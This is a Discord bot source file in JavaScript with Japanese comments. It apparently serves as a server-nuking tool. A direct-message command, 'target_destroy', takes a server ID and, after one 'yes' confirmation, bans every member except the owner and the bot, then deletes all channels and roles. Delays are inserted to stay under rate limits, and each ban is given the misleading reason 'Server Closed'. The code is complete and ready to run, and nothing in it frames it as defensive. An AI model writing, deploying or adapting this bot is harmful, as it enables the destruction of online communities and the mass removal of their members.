const { Client, GatewayIntentBits, PermissionFlagsBits } = require('discord.js');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.MessageContent
    ],
    partials: ['CHANNEL']
});

const prefix = '!';

client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.content.startsWith(prefix)) return;
    if (message.guild) return; // DMのみ

    const args = message.content.slice(prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === 'target_destroy') {
        const guildId = args[0];
        if (!guildId) return message.reply('サーバーIDを指定してください。');

        const guild = client.guilds.cache.get(guildId);
        if (!guild) return message.reply('サーバーが見つかりません。');

        // 【確認なし】すぐに実行確認へ
        await message.reply(`⚠️ サーバー「${guild.name}」の全消去を開始しますか？\n\`yes\` と打つと実行されます。`);

        const filter = (m) => m.author.id === message.author.id && m.content.toLowerCase() === 'yes';
        const collector = message.channel.createMessageCollector({ filter, time: 20000, max: 1 });

        collector.on('collect', async () => {
            await message.reply('破壊処理を開始しました...');

            // 1. メンバーをBAN
            try {
                const members = await guild.members.fetch();
                for (const m of members.values()) {
                    if (m.id !== guild.ownerId && m.id !== client.user.id) {
                        await m.ban({ reason: 'Server Closed' }).catch(() => {});
                        await new Promise(r => setTimeout(r, 300));
                    }
                }
            } catch (e) { console.error("BAN Error:", e); }

            // 2. チャンネル削除
            try {
                const channels = await guild.channels.fetch();
                for (const c of channels.values()) {
                    await c.delete().catch(() => {});
                    await new Promise(r => setTimeout(r, 200));
                }
            } catch (e) { console.error("Channel Error:", e); }

            // 3. ロール削除
            try {
                const roles = await guild.roles.fetch();
                for (const r of roles.values()) {
                    if (r.name !== '@everyone' && !r.managed) {
                        await r.delete().catch(() => {});
                        await new Promise(r => setTimeout(r, 200));
                    }
                }
            } catch (e) { console.error("Role Error:", e); }

            await message.reply(`完了しました。`);
        });
    }
});

client.login(process.env.DISCORD_BOT_TOKEN);
